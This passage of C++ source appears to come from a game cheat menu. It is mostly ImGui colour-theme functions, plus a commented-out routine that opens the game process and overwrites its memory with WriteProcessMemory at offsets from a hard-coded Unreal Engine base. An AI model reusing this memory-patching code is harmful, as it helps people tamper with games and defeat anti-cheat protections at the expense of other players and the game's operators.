		int days = (elapsed_seconds % 604800) / 86400;
		return std::to_string(weeks) + " weeks, " + std::to_string(days) + " days";
	}
	else
	{
		int months = elapsed_seconds / 2592000;
		int days = (elapsed_seconds % 2592000) / 86400;
		return std::to_string(months) + " months, " + std::to_string(days) + " days";
	}
}


void random_color(int iTick)
{
	ImVec4(sin(5.f * iTick + 0.f) * 127 + 128 / 255.0f, sin(5.f * iTick + ((2.f * 3.14159265358979323846) / 3)) * 127 + 128 / 255.0f, sin(5.f * iTick + ((4.f * 3.14159265358979323846) / 3)) * 127 + 128 / 255.0f, 255 / 255.0f);

}

bool AntiSpam = false;
//VOID Notification()
//{
//	//while (true)
//	//{
//
//	if (Setting::TotalEnemy/* && !AntiSpam*/)
//	{
//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000, "SS" });
//		//AntiSpam = true;
//	}
//	else //if (!Setting::TotalEnemy/* && AntiSpam*/)
//	{
//		ImGui::InsertNotification({ ImGuiToastType_Success, 3000,"LL" });
//		//AntiSpam = false;
//
//	}
//
//	//	std::this_thread::sleep_for(std::chrono::milliseconds(20));
//	//}
//
//}


//void offsetsearch2(int offset, BYTE write[], SIZE_T size, int header)
//{
//	DWORD pidd = Game::Id;
//	HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pidd);
//	int addr = header + offset;
//	unsigned long OldProtect;
//	unsigned long OldProtect2;
//	VirtualProtectEx(phandle, (BYTE*)addr, size, PAGE_EXECUTE_READWRITE, &OldProtect);
//	WriteProcessMemory(phandle, (BYTE*)addr, write, size, NULL);
//	VirtualProtectEx(phandle, (BYTE*)addr, size, OldProtect, NULL);
//}
//
//std::vector<std::string> SplitString(const std::string& str, const std::string& delimeter)
//{
//	std::vector<std::string> Return;
//	auto start = 0U;
//	auto end = str.find(delimeter);
//	while (end != std::string::npos)
//	{
//		Return.push_back(str.substr(start, end - start));
//		start = end + delimeter.length();
//		end = str.find(delimeter, start);
//	}
//
//	Return.push_back(str.substr(start, end));
//	return Return;
//}
//
//struct Aob_byte {
//	int x;
//	bool f;
//};
//
//std::vector<Aob_byte> convert_pattern(const std::string& pattern)
//{
//	std::vector<Aob_byte> ret;
//	auto parts = SplitString(pattern, " ");
//	for (const auto& part : parts)
//	{
//		if (part == "??")
//		{
//			ret.emplace_back(Aob_byte{ 0, false });
//		}
//		else
//		{
//			ret.emplace_back(Aob_byte{ static_cast<BYTE>(std::stoi(part, nullptr, 16)), true });
//		}
//		//if (part == "")
//		//{
//		//    //nope
//		//}
//		//if (part == " ")
//		//{
//		//    //nope
//		//}
//	}
//
//	return ret;
//}
//
//int checks;
//int offset;
//vector<DWORD_PTR> tmpbuff;
//bool patcherr(long addr, BYTE write[], SIZE_T sizee) {
//	DWORD pidd = Game::Id;
//	HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pidd);
//	unsigned long OldProtect;
//	unsigned long OldProtect2;
//	VirtualProtectEx(phandle, (void*)addr, sizee, PAGE_EXECUTE_READWRITE, &OldProtect);
//	WriteProcessMemory(phandle, (void*)addr, write, sizee, NULL);
//	VirtualProtectEx(phandle, (void*)addr, sizee, OldProtect, NULL);
//	return true;
//}
//
//void //Utility::writeBytes() {
//
//	int size = tmpbuff.size();
//	BYTE* tmp = new BYTE[size];
//	for (int i = 0; i < size; i++)
//	{
//		tmp[i] = tmpbuff[i];
//	}
//	patcherr(offset, tmp, sizeof(tmp));
//	delete[] tmp;
//	//clear stacks
//	offset = 0;
//	checks = 0;
//	tmpbuff.clear();
//}
//
//template<typename First, typename ... Strings>
//
//void //Utility::writeBytes(First arg, const Strings&... rest) {
//	if (checks == 0)
//	{
//		offset = (unsigned int)arg;
//		//cout << offset << endl;
//		checks++;
//	}
//	else
//	{
//		tmpbuff.push_back((unsigned int)arg);
//	}
//	//Utility::writeBytes(rest...);
//}
//
//void //Utility::writeBytes(int offsets, std::string bytearray)
//{
//	std::vector<Aob_byte> shit = convert_pattern(bytearray);
//	int size = shit.size();
//	BYTE* tmp = new BYTE[size];
//	for (int i = 0; i < size; i++)
//	{
//		tmp[i] = shit[i].x;
//	}
//	int UE4Base = Utility::ReadMemoryEx<int>(0xE0C3868);
//	if (UE4Base > 0x1000)
//	{
//		offsetsearch2(offsets, tmp, size, UE4Base);
//	}
//	else
//	{
//		offsetsearch2(offsets, tmp, size, UE4Base);
//	}
//	delete[] tmp;
//}
//
void RunStyle()
{


	ImGuiStyle& style = ImGui::GetStyle();
	//WindowBg = WindowBackground
	style.Colors[ImGuiCol_WindowBg] = ImColor(30, 30, 30); //Black Color
	style.Colors[ImGuiCol_TitleBg] = ImColor(0, 0, 0);
	style.Colors[ImGuiCol_TitleBgActive] = ImColor(0, 0, 0);
	style.Colors[ImGuiCol_TitleBgCollapsed] = ImColor(139, 0, 0);
	style.Colors[ImGuiCol_Button] = ImColor(0, 0, 0);
	style.Colors[ImGuiCol_ButtonActive] = ImColor(193, 77, 77);
	style.Colors[ImGuiCol_ButtonHovered] = ImColor(139, 0, 0);
	style.Colors[ImGuiCol_Tab] = ImColor(205, 92, 92);
	style.Colors[ImGuiCol_TabActive] = ImColor(205, 92, 92);
	style.Colors[ImGuiCol_TabHovered] = ImColor(139, 0, 0);
	style.Colors[ImGuiCol_Border] = ImColor(0, 0, 0);
	//style.Colors[ImGuiCol_TableBorderLight] = ImColor(139,0,0);
	style.Colors[ImGuiCol_CheckMark] = ImColor(255, 255, 255, 255);
	style.Colors[ImGuiCol_ResizeGrip] = ImColor(255, 255, 255, 255);
	style.Colors[ImGuiCol_Header] = ImColor(0, 0, 0);
	style.Colors[ImGuiCol_HeaderActive] = ImColor(193, 77, 77);
	style.Colors[ImGuiCol_HeaderHovered] = ImColor(139, 0, 0);
	style.Colors[ImGuiCol_PopupBg] = ImColor(0, 0, 0);;

	style.Colors[ImGuiCol_TextSelectedBg] = ImColor(0, 0, 0);
	style.Colors[ImGuiCol_ChildBg] = ImColor(0, 0, 0);
	style.Colors[ImGuiCol_Text] = ImColor(255, 255, 255, 255);
	style.Colors[ImGuiCol_TextDisabled] = ImColor(255, 255, 255, 255);
	style.Colors[ImGuiCol_FrameBg] = ImColor(193, 77, 77);
	style.Colors[ImGuiCol_FrameBgActive] = ImColor(193, 77, 77);
	style.Colors[ImGuiCol_FrameBgHovered] = ImColor(139, 0, 0);
	style.Colors[ImGuiCol_ScrollbarBg] = ImColor(0, 0, 0, 255);
	style.Colors[ImGuiCol_ScrollbarGrab] = ImColor(139, 0, 0);
	style.Colors[ImGuiCol_ScrollbarGrabActive] = ImColor(139, 0, 0);
	style.Colors[ImGuiCol_ScrollbarGrabActive] = ImColor(255, 255, 255, 255);
	style.Colors[ImGuiCol_MenuBarBg] = ImColor(255, 255, 255, 255);
	style.Colors[ImGuiCol_Separator] = ImColor(255, 255, 255, 255);
	style.FrameRounding = 7.0f;
	style.WindowRounding = 7.0f;
	style.GrabRounding = 2.0f;
	style.WindowTitleAlign.x = 0.50f;
}
void RunStyle2()
{


	auto& io = ImGui::GetIO();
	// io.Fonts->AddFontFromFileTTF("Assets/Fonts//Ruda-Bold.ttf", 15.0f, &config);

	auto& style = ImGui::GetStyle();


	ImVec4* colors = ImGui::GetStyle().Colors;
	colors[ImGuiCol_Text] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.06f, 0.06f, 0.06f, 0.94f);
	colors[ImGuiCol_ChildBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.08f, 0.08f, 0.08f, 0.94f);
	colors[ImGuiCol_Border] = ImVec4(0.43f, 0.43f, 0.50f, 0.50f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_TitleBg] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.14f, 0.14f, 0.14f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.02f, 0.02f, 0.02f, 0.53f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.31f, 0.31f, 0.31f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.41f, 0.41f, 0.41f, 1.00f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.51f, 0.51f, 0.51f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_SliderGrab] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_Button] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_Header] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_Separator] = ImVec4(0.43f, 0.43f, 0.50f, 0.50f);
	colors[ImGuiCol_SeparatorHovered] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_SeparatorActive] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(0.42f, 0.02f, 0.02f, 0.54f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_Tab] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_TabHovered] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_TabActive] = ImVec4(0.42f, 0.02f, 0.02f, 51.45f);
	colors[ImGuiCol_TabUnfocused] = ImVec4(0.07f, 0.10f, 0.15f, 0.97f);
	colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.14f, 0.26f, 0.42f, 1.00f);
	colors[ImGuiCol_PlotLines] = ImVec4(0.61f, 0.61f, 0.61f, 1.00f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	colors[ImGuiCol_TableHeaderBg] = ImVec4(0.19f, 0.19f, 0.20f, 1.00f);
	colors[ImGuiCol_TableBorderStrong] = ImVec4(0.31f, 0.31f, 0.35f, 1.00f);
	colors[ImGuiCol_TableBorderLight] = ImVec4(0.23f, 0.23f, 0.25f, 1.00f);
	colors[ImGuiCol_TableRowBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_TableRowBgAlt] = ImVec4(1.00f, 1.00f, 1.00f, 0.06f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_DragDropTarget] = ImVec4(0.42f, 0.02f, 0.02f, 0.51f);
	colors[ImGuiCol_NavHighlight] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
	colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
	colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.35f);
	style.FrameRounding = 7.0f;
	style.WindowRounding = 7.0f;
	style.GrabRounding = 2.0f;
	style.WindowTitleAlign.x = 0.50f;
}
void RunStyle3()
{
	ImGuiStyle& style = ImGui::GetStyle();
	//style.WindowRounding = 5.3f;
	//style.FrameRounding = 2.3f;
	//style.ScrollbarRounding = 0;

	style.Colors[ImGuiCol_Text] = ImVec4(0.90f, 0.90f, 0.90f, 0.90f);
	style.Colors[ImGuiCol_TextDisabled] = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
	style.Colors[ImGuiCol_WindowBg] = ImVec4(0.09f, 0.09f, 0.15f, 1.00f);
	// style.Colors[ImGuiCol_ChildWindowBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	style.Colors[ImGuiCol_PopupBg] = ImVec4(0.05f, 0.05f, 0.10f, 0.85f);
	style.Colors[ImGuiCol_Border] = ImVec4(0.70f, 0.70f, 0.70f, 0.65f);
	style.Colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	style.Colors[ImGuiCol_FrameBg] = ImVec4(0.00f, 0.00f, 0.01f, 1.00f);
	style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.90f, 0.80f, 0.80f, 0.40f);
	style.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.90f, 0.65f, 0.65f, 0.45f);
	style.Colors[ImGuiCol_TitleBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.83f);
	style.Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.40f, 0.40f, 0.80f, 0.20f);
	style.Colors[ImGuiCol_TitleBgActive] = ImVec4(0.00f, 0.00f, 0.00f, 0.87f);
	style.Colors[ImGuiCol_MenuBarBg] = ImVec4(0.01f, 0.01f, 0.02f, 0.80f);
	style.Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.20f, 0.25f, 0.30f, 0.60f);
	style.Colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.55f, 0.53f, 0.55f, 0.51f);
	style.Colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.56f, 1.00f);
	style.Colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.56f, 0.56f, 0.56f, 0.91f);
	//  style.Colors[ImGuiCol_ComboBg] = ImVec4(0.1f, 0.1f, 0.1f, 0.99f);
	style.Colors[ImGuiCol_CheckMark] = ImVec4(0.90f, 0.90f, 0.90f, 0.83f);
	style.Colors[ImGuiCol_SliderGrab] = ImVec4(0.70f, 0.70f, 0.70f, 0.62f);
	style.Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.30f, 0.30f, 0.30f, 0.84f);
	style.Colors[ImGuiCol_Button] = ImVec4(0.48f, 0.72f, 0.89f, 0.49f);
	style.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.50f, 0.69f, 0.99f, 0.68f);
	style.Colors[ImGuiCol_ButtonActive] = ImVec4(0.80f, 0.50f, 0.50f, 1.00f);
	style.Colors[ImGuiCol_Header] = ImVec4(0.30f, 0.69f, 1.00f, 0.53f);
	style.Colors[ImGuiCol_HeaderHovered] = ImVec4(0.44f, 0.61f, 0.86f, 1.00f);
	style.Colors[ImGuiCol_HeaderActive] = ImVec4(0.38f, 0.62f, 0.83f, 1.00f);
	//  style.Colors[ImGuiCol_Column] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
	//  style.Colors[ImGuiCol_ColumnHovered] = ImVec4(0.70f, 0.60f, 0.60f, 1.00f);
	//  style.Colors[ImGuiCol_ColumnActive] = ImVec4(0.90f, 0.70f, 0.70f, 1.00f);
	style.Colors[ImGuiCol_ResizeGrip] = ImVec4(1.00f, 1.00f, 1.00f, 0.85f);
	style.Colors[ImGuiCol_ResizeGripHovered] = ImVec4(1.00f, 1.00f, 1.00f, 0.60f);
	style.Colors[ImGuiCol_ResizeGripActive] = ImVec4(1.00f, 1.00f, 1.00f, 0.90f);
	// style.Colors[ImGuiCol_CloseButton] = ImVec4(0.50f, 0.50f, 0.90f, 0.50f);
   //  style.Colors[ImGuiCol_CloseButtonHovered] = ImVec4(0.70f, 0.70f, 0.90f, 0.60f);
	// style.Colors[ImGuiCol_CloseButtonActive] = ImVec4(0.70f, 0.70f, 0.70f, 1.00f);
	style.Colors[ImGuiCol_PlotLines] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	style.Colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	style.Colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	style.Colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	style.Colors[ImGuiCol_TextSelectedBg] = ImVec4(0.00f, 0.00f, 1.00f, 0.35f);
	//  style.Colors[ImGuiCol_ModalWindowDarkening] = ImVec4(0.20f, 0.20f, 0.20f, 0.35f);
	style.FrameRounding = 7.0f;
	style.WindowRounding = 7.0f;
	style.GrabRounding = 2.0f;
	style.WindowTitleAlign.x = 0.50f;
}
void RunStyle4()
{




	ImGuiStyle& style = ImGui::GetStyle();
	style.Colors[ImGuiCol_Text] = ImVec4(1.0f, 1.0f, 1.0f, 1.0f);
	style.Colors[ImGuiCol_TextDisabled] = ImVec4(0.2745098173618317f, 0.3176470696926117f, 0.4509803950786591f, 1.0f);
	style.Colors[ImGuiCol_WindowBg] = ImVec4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
	style.Colors[ImGuiCol_ChildBg] = ImVec4(0.09250493347644806f, 0.100297249853611f, 0.1158798336982727f, 1.0f);
	style.Colors[ImGuiCol_PopupBg] = ImVec4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
	style.Colors[ImGuiCol_Border] = ImVec4(0.1568627506494522f, 0.168627455830574f, 0.1921568661928177f, 1.0f);
	style.Colors[ImGuiCol_BorderShadow] = ImVec4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
	style.Colors[ImGuiCol_FrameBg] = ImVec4(0.1120669096708298f, 0.1262156516313553f, 0.1545064449310303f, 1.0f);
	style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.1568627506494522f, 0.168627455830574f, 0.1921568661928177f, 1.0f);
	style.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.1568627506494522f, 0.168627455830574f, 0.1921568661928177f, 1.0f);
	style.Colors[ImGuiCol_TitleBg] = ImVec4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
	style.Colors[ImGuiCol_TitleBgActive] = ImVec4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
	style.Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
	style.Colors[ImGuiCol_MenuBarBg] = ImVec4(0.09803921729326248f, 0.105882354080677f, 0.1215686276555061f, 1.0f);
	style.Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
	style.Colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
	style.Colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.1568627506494522f, 0.168627455830574f, 0.1921568661928177f, 1.0f);
	style.Colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
	style.Colors[ImGuiCol_CheckMark] = ImVec4(66, 86, 97, 255);
	style.Colors[ImGuiCol_SliderGrab] = ImVec4(66, 86, 97, 200);
	style.Colors[ImGuiCol_SliderGrabActive] = ImVec4(66, 86, 97, 255);
	style.Colors[ImGuiCol_Button] = ImVec4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
	style.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.1821731775999069f, 0.1897992044687271f, 0.1974248886108398f, 1.0f);
	style.Colors[ImGuiCol_ButtonActive] = ImVec4(0.1545050293207169f, 0.1545048952102661f, 0.1545064449310303f, 1.0f);
	style.Colors[ImGuiCol_Header] = ImVec4(0.1414651423692703f, 0.1629818230867386f, 0.2060086131095886f, 1.0f);
	style.Colors[ImGuiCol_HeaderHovered] = ImVec4(0.1072951927781105f, 0.107295036315918f, 0.1072961091995239f, 1.0f);
	style.Colors[ImGuiCol_HeaderActive] = ImVec4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
	style.Colors[ImGuiCol_Separator] = ImVec4(0.1293079704046249f, 0.1479243338108063f, 0.1931330561637878f, 1.0f);
	style.Colors[ImGuiCol_SeparatorHovered] = ImVec4(0.1568627506494522f, 0.1843137294054031f, 0.250980406999588f, 1.0f);
	style.Colors[ImGuiCol_SeparatorActive] = ImVec4(0.1568627506494522f, 0.1843137294054031f, 0.250980406999588f, 1.0f);
	style.Colors[ImGuiCol_ResizeGrip] = ImVec4(66, 86, 97, 200);
	style.Colors[ImGuiCol_ResizeGripHovered] = ImVec4(66, 86, 97, 255);
	style.Colors[ImGuiCol_ResizeGripActive] = ImVec4(66, 86, 97, 255);
	style.Colors[ImGuiCol_Tab] = ImVec4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
	style.Colors[ImGuiCol_TabHovered] = ImVec4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
	style.Colors[ImGuiCol_TabActive] = ImVec4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
	style.Colors[ImGuiCol_TabUnfocused] = ImVec4(0.0784313753247261f, 0.08627451211214066f, 0.1019607856869698f, 1.0f);
	style.Colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.1249424293637276f, 0.2735691666603088f, 0.5708154439926147f, 1.0f);
	style.Colors[ImGuiCol_PlotLines] = ImVec4(0.5215686559677124f, 0.6000000238418579f, 0.7019608020782471f, 1.0f);
	style.Colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.03921568766236305f, 0.9803921580314636f, 0.9803921580314636f, 1.0f);
	style.Colors[ImGuiCol_PlotHistogram] = ImVec4(0.8841201663017273f, 0.7941429018974304f, 0.5615870356559753f, 1.0f);
	style.Colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.9570815563201904f, 0.9570719599723816f, 0.9570761322975159f, 1.0f);
	style.Colors[ImGuiCol_TableHeaderBg] = ImVec4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
	style.Colors[ImGuiCol_TableBorderStrong] = ImVec4(0.0470588244497776f, 0.05490196123719215f, 0.07058823853731155f, 1.0f);
	style.Colors[ImGuiCol_TableBorderLight] = ImVec4(0.0f, 0.0f, 0.0f, 1.0f);
	style.Colors[ImGuiCol_TableRowBg] = ImVec4(0.1176470592617989f, 0.1333333402872086f, 0.1490196138620377f, 1.0f);
	style.Colors[ImGuiCol_TableRowBgAlt] = ImVec4(0.09803921729326248f, 0.105882354080677f, 0.1215686276555061f, 1.0f);
	style.Colors[ImGuiCol_TextSelectedBg] = ImVec4(0.9356134533882141f, 0.9356129765510559f, 0.9356223344802856f, 1.0f);
	style.Colors[ImGuiCol_DragDropTarget] = ImVec4(0.4980392158031464f, 0.5137255191802979f, 1.0f, 1.0f);
	style.Colors[ImGuiCol_NavHighlight] = ImVec4(0.266094446182251f, 0.2890366911888123f, 1.0f, 1.0f);
	style.Colors[ImGuiCol_NavWindowingHighlight] = ImVec4(0.4980392158031464f, 0.5137255191802979f, 1.0f, 1.0f);
	style.Colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.196078434586525f, 0.1764705926179886f, 0.5450980663299561f, 0.501960813999176f);
	style.Colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.196078434586525f, 0.1764705926179886f, 0.5450980663299561f, 0.501960813999176f);


	style.ScrollbarSize = 8;
	style.FrameRounding = 12.0f;
	style.WindowRounding = 7.0f;
	style.GrabRounding = 1.0f;
	//style.GrabMinSize = 1.0f;
	style.WindowTitleAlign.x = 0.50f;
	//// style.Colors[ImGuiCol_TooltipBg] = ImVec4(0.82f, 0.92f, 1.00f, 0.90f);
	//style.Alpha = 1.0f;
	////  style.WindowFillAlphaDEFAULT = 1.0f;
	//style.FrameRounding = 4;
	//style.IndentSpacing = 12.0f;
}
void StyleColorsLightGreen()
{




	ImGuiStyle* style = &ImGui::GetStyle();
	ImVec4* colors = style->Colors;

	style->WindowTitleAlign.x = 0.50f;
	style->GrabRounding = 2;
	style->FrameRounding = 7;
	style->WindowRounding = 7;

	colors[ImGuiCol_Text] = ImVec4(0.00f, 0.00f, 0.00f, 1.00f);
	colors[ImGuiCol_TextDisabled] = ImVec4(0.60f, 0.60f, 0.60f, 1.00f);
	colors[ImGuiCol_WindowBg] = ImVec4(0.86f, 0.86f, 0.86f, 1.00f);
	//colors[ImGuiCol_ChildWindowBg]         = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_ChildBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
	colors[ImGuiCol_PopupBg] = ImVec4(0.93f, 0.93f, 0.93f, 0.98f);
	colors[ImGuiCol_Border] = ImVec4(0.71f, 0.71f, 0.71f, 0.08f);
	colors[ImGuiCol_BorderShadow] = ImVec4(0.00f, 0.00f, 0.00f, 0.04f);
	colors[ImGuiCol_FrameBg] = ImVec4(0.71f, 0.71f, 0.71f, 0.55f);
	colors[ImGuiCol_FrameBgHovered] = ImVec4(0.94f, 0.94f, 0.94f, 0.55f);
	colors[ImGuiCol_FrameBgActive] = ImVec4(0.71f, 0.78f, 0.69f, 0.98f);
	colors[ImGuiCol_TitleBg] = ImVec4(0.85f, 0.85f, 0.85f, 1.00f);
	colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.82f, 0.78f, 0.78f, 0.51f);
	colors[ImGuiCol_TitleBgActive] = ImVec4(0.78f, 0.78f, 0.78f, 1.00f);
	colors[ImGuiCol_MenuBarBg] = ImVec4(0.86f, 0.86f, 0.86f, 1.00f);
	colors[ImGuiCol_ScrollbarBg] = ImVec4(0.20f, 0.25f, 0.30f, 0.61f);
	colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.90f, 0.90f, 0.90f, 0.30f);
	colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.92f, 0.92f, 0.92f, 0.78f);
	colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(1.00f, 1.00f, 1.00f, 1.00f);
	colors[ImGuiCol_CheckMark] = ImVec4(0.184f, 0.407f, 0.193f, 1.00f);
	colors[ImGuiCol_SliderGrab] = ImVec4(0.26f, 0.59f, 0.98f, 0.78f);
	colors[ImGuiCol_SliderGrabActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_Button] = ImVec4(0.71f, 0.78f, 0.69f, 0.40f);
	colors[ImGuiCol_ButtonHovered] = ImVec4(0.725f, 0.805f, 0.702f, 1.00f);
	colors[ImGuiCol_ButtonActive] = ImVec4(0.793f, 0.900f, 0.836f, 1.00f);
	colors[ImGuiCol_Header] = ImVec4(0.71f, 0.78f, 0.69f, 0.31f);
	colors[ImGuiCol_HeaderHovered] = ImVec4(0.71f, 0.78f, 0.69f, 0.80f);
	colors[ImGuiCol_HeaderActive] = ImVec4(0.71f, 0.78f, 0.69f, 1.00f);
	//   colors[ImGuiCol_Column] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	//   colors[ImGuiCol_ColumnHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.78f);
	//   colors[ImGuiCol_ColumnActive] = ImVec4(0.26f, 0.59f, 0.98f, 1.00f);
	colors[ImGuiCol_Separator] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	colors[ImGuiCol_SeparatorHovered] = ImVec4(0.14f, 0.44f, 0.80f, 0.78f);
	colors[ImGuiCol_SeparatorActive] = ImVec4(0.14f, 0.44f, 0.80f, 1.00f);
	colors[ImGuiCol_ResizeGrip] = ImVec4(1.00f, 1.00f, 1.00f, 0.00f);
	colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.26f, 0.59f, 0.98f, 0.45f);
	colors[ImGuiCol_ResizeGripActive] = ImVec4(0.26f, 0.59f, 0.98f, 0.78f);
	colors[ImGuiCol_PlotLines] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
	colors[ImGuiCol_PlotLinesHovered] = ImVec4(1.00f, 0.43f, 0.35f, 1.00f);
	colors[ImGuiCol_PlotHistogram] = ImVec4(0.90f, 0.70f, 0.00f, 1.00f);
	colors[ImGuiCol_PlotHistogramHovered] = ImVec4(1.00f, 0.60f, 0.00f, 1.00f);
	colors[ImGuiCol_TextSelectedBg] = ImVec4(0.26f, 0.59f, 0.98f, 0.35f);
	//  colors[ImGuiCol_ModalWindowDarkening] = ImVec4(0.20f, 0.20f, 0.20f, 0.35f);
	colors[ImGuiCol_DragDropTarget] = ImVec4(0.26f, 0.59f, 0.98f, 0.95f);
